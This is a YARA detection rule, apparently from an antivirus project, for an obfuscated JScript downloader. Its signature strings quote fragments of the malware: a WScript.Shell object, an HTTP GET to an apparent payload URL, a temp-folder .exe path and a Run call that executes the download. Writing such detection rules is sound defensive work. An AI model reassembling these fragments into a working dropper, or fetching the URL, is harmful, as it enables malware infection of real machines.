rule sig_20160328_4ff5bfca6e675eea0c27e1b3f3f7ea76 {
  meta:
    description = "datamaliciousorder - file 20160328_4ff5bfca6e675eea0c27e1b3f3f7ea76.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "20a27aa69d49805c223e3e642ad9bdb9705ef7fd8df2adb7d89ffdd96f7fb3c9"

  strings:
    $s1  = "function Zbzcpistcd() {return Popovwac[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"beHtm4tJMWBvCM.exe\";};" fullword ascii
    $s2  = "Tbbqwkmhlf[Qbmxocyxk](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Sxydz](Qmjgofgf() * 11)} while (Tbbqwkmhlf[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Popovwac = function Yseppnj() {return WScript[Xdbuvr](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Pdrxb(Holgat, Porvbpct){return Holgat - Porvbpct;};" fullword ascii
    $s6  = "function Ppffyqs() {return ((Bfgjb == true) && (Bfgjb == Xlxjmygxbt)) ? 1 : Uifpajwv;};" fullword ascii
    $s7  = "function Jpebg(Krtkncl){Popovwac[\"Run\"](Krtkncl, Uifpajwv, Uifpajwv);};" fullword ascii
    $s8  = "var Xlxjmygxbt = false;" fullword ascii
    $s9  = "var Xpbgjsc = false;" fullword ascii
    $s10 = "Xlxjmygxbt = true; " fullword ascii
    $s11 = "function Lcrmw(){return Xhkhbois;};" fullword ascii
    $s12 = "function Qfcccbv(){return Xdbuvr;};" fullword ascii
    $s13 = "Bfgjb = true; " fullword ascii
    $s14 = "var Vntbqi = new this[\"Date\"]();" fullword ascii
    $s15 = "function Qmjgofgf(){return 22;};" fullword ascii
    $s16 = "function Nlotqj(Dcoquahig) {var Zktbwjmut = (1, 2, 3, 4, 5, Dcoquahig); return Zktbwjmut;};" fullword ascii
    $s17 = "var Bfgjb = false;" fullword ascii
    $s18 = " while (Jdufoasvpq){" fullword ascii
    $s19 = "function Ckkotgcn()" fullword ascii
    $s20 = "return Pdrxb(Encwycxau, Kaekdz);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}